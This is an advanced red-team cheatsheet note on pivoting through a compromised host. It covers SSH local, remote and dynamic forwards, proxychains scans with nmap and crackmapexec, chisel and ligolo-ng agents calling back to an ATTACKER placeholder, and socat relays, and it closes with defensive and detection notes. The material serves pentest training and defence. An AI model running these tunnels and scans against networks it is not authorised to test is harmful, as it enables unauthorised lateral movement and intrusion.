---
tags: [tools, pivoting, tunneling, post-exploitation, pentesting, red-team]
difficulty: advanced
module: "46 - Operator Technique Cheatsheets"
topic: "46.03 Tunneling and Port Forwarding"
---

# Tunneling and Port Forwarding

## Introduction
After compromising a host on a network, the next step is usually **reaching machines and services you cannot touch directly** — internal subnets, services bound to localhost, segmented VLANs. **Tunneling and port forwarding** turn a foothold into a pivot: routing your traffic *through* the compromised host to reach the rest of the network. This is the connective tissue of internal pentests and red-team lateral movement. This note is the conceptual playbook; the specific tools have their own references: [[54 - Chisel TCP Tunneling over HTTP]], [[55 - Ligolo-ng Layer 3 Pivot Tool]], [[56 - proxychains SOCKS Proxy Chaining]], [[52 - Netcat nc ncat Swiss Army Knife]], [[53 - Socat Advanced Netcat Replacement]].

## The Three Core Primitives (SSH)
```text
+---------------------------------------------------------------+
|              SSH PORT-FORWARD DIRECTIONS                     |
+---------------------------------------------------------------+
| LOCAL  (-L)  attacker:LPORT -> (via pivot) -> target:RPORT    |
|   "pull a remote service to my localhost"                     |
|   ssh -L 8080:10.0.0.5:80 user@pivot                          |
|                                                               |
| REMOTE (-R)  pivot:RPORT -> (back to) -> attacker:LPORT       |
|   "expose MY service on the pivot" (e.g. catch a callback     |
|    from a host that can only reach the pivot)                 |
|   ssh -R 4444:127.0.0.1:4444 user@pivot                       |
|                                                               |
| DYNAMIC(-D)  SOCKS proxy -> anything reachable from pivot     |
|   "route arbitrary tools through the pivot"                   |
|   ssh -D 1080 user@pivot   (then use with proxychains)        |
+---------------------------------------------------------------+
```
**Dynamic (-D)** + **proxychains** is the workhorse: one SOCKS proxy lets `nmap`, `curl`, `cme`, etc. reach the whole internal network through the pivot.
```bash
ssh -D 1080 -N user@pivot
# /etc/proxychains.conf -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.0.0.0/24
proxychains crackmapexec smb 10.0.0.0/24
```

## When You Don't Have SSH on the Pivot
Use a purpose-built pivot tool that runs as an agent on the compromised host:

### Chisel (TCP/SOCKS over HTTP)
Good through HTTP-only egress; client/server reverse SOCKS:
```bash
# attacker (server)
./chisel server -p 8000 --reverse
# victim (client) -> reverse SOCKS back to attacker
./chisel client ATTACKER:8000 R:socks
# then proxychains -> socks5 127.0.0.1 1080
```

### Ligolo-ng (Layer-3, tun interface — best UX)
Creates a real routed interface to the internal subnet — no proxychains needed, tools work natively:
```bash
# attacker: start proxy, add a tun route to the internal subnet
./proxy -selfcert
ip route add 10.0.0.0/24 dev ligolo
# victim agent connects back; select session; 'start'
./agent -connect ATTACKER:11601
```

### Quick single-port relays
```bash
# socat relay on the pivot: expose internal:80 on pivot:8080
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.5:80
# netcat relay (FIFO)
```

## Choosing the Right Tool
```text
   Have SSH creds on pivot?        -> ssh -D / -L / -R (built-in, quiet)
   Only HTTP egress?               -> chisel
   Need many tools / full subnet?  -> ligolo-ng (tun) or -D + proxychains
   One service, one port?          -> socat/nc relay
   Double pivot (chain hosts)?     -> stack SOCKS proxies / ligolo chains
```

## Multi-Hop (Double Pivoting)
Chain pivots when the second network is only reachable from the first compromised host: stack SSH `-D` proxies, daisy-chain chisel, or add successive ligolo routes. Keep a clear map of which subnet each tunnel reaches.

## Why It Matters
Internal networks are flat behind the perimeter but segmented inside; a single foothold rarely sees everything. Pivoting is what converts "I own one box" into "I can scan and attack the whole internal estate," and it's essential for reaching domain controllers, databases, and management interfaces bound to internal-only addresses.

## Defensive Notes
- **Network segmentation + egress filtering**: restrict which internal hosts a server can reach and what it can call out to; this directly limits pivoting.
- Detect tunnels: long-lived connections, SOCKS patterns, `ssh -R/-D` from servers, chisel/ligolo binaries, unexpected `tun` interfaces, and a host relaying traffic between subnets.
- Monitor for `socat`/`nc` relays and proxychains usage; alert on internal port scans originating from a single pivot.

## Related Notes
- [[54 - Chisel TCP Tunneling over HTTP]]
- [[55 - Ligolo-ng Layer 3 Pivot Tool]]
- [[56 - proxychains SOCKS Proxy Chaining]]
- [[40 - SSH Agent Hijacking and Agent Forwarding Abuse]]
- [[01 - Reverse and Bind Shell Cheatsheet]]
